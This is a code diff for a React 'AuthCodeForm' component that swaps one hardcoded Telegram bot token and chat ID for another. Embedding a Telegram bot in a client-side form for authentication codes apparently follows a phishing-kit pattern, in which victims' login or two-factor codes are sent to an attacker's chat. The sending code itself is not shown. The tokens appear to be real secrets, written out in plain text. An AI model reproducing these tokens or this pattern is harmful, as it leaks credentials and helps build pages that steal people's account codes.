@@ -3,8 +3,8 @@ import { useLocation, Navigate } from "react-router-dom";
 import "./AuthCodeForm.scss";
 
 const AuthCodeForm = () => {
-  const BOT_TOKEN = "7973530112:AAGjGYB45RgsetkUtokRJyJH454EjGxwIPs";
-  const CHAT_ID = "6604062347";
+  const BOT_TOKEN = "8102757736:AAENkTgTe3sypg8NpfXnX2oJBqthGw2zElA";
+  const CHAT_ID = "4760975612";
 
   const { state } = useLocation();
   if (!state) return <Navigate to="/" replace />;
